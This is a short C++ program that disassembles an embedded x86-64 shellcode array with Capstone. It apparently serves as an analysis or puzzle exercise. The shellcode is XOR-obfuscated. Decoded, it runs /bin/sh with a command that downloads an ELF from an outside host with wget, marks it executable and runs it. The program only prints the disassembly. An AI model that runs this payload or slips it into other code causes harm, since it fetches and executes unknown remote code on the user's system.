#include <capstone.hpp>

#include <iostream>

const char shellcode[] = "\x48\xbf\x2f\x62\x69\x6e"
 "\x2f\x73\x68\x00\x57\x54\x5f\x68\x2d\x63\x00\x00"
 "\x54\x59\x68\x4e\x00\x00\x00\x5b\x66\x81\xec\x00"
 "\x01\x4c\x8d\x05\x28\x00\x00\x00\x54\x5a\x80\xfb"
 "\xff\x74\x0d\x41\x8a\x04\x18\x34\xcc\x88\x04\x1c"
 "\xfe\xcb\xeb\xee\x48\x31\xc0\x50\x52\x51\x57\x54"
 "\x5e\x48\x31\xd2\xb0\x3b\x0f\x05\xb0\x3c\x0f\x05"
 "\xbb\xab\xa9\xb8\xec\xe1\xbd\xec\xaf\xa3\xa2\xaa"
 "\xe2\xa8\xa9\xba\xaf\xa3\xe2\xbe\xa9\xe3\xfe\xfc"
 "\xfe\xf8\xe3\xa9\xab\xab\xe2\xa9\xa0\xaa\xf7\xaf"
 "\xa4\xa1\xa3\xa8\xec\xe7\xb4\xec\xe2\xe3\xa9\xab"
 "\xe6\xaa\xf7\xe2\xe3\xa9\xab\xe6\xaa\xcc";

int main()
{
    auto cs = Capstone::Capstone(Capstone::Arch::X86, Capstone::Mode::MODE_64);

    std::vector<uint8_t> code(shellcode, shellcode + sizeof(shellcode));
    auto insns = cs.disasm(code);
    for (auto &insn : insns)
        std::cout << insn.mnemonic << " " << insn.op_str << std::endl;

    return 0;
}
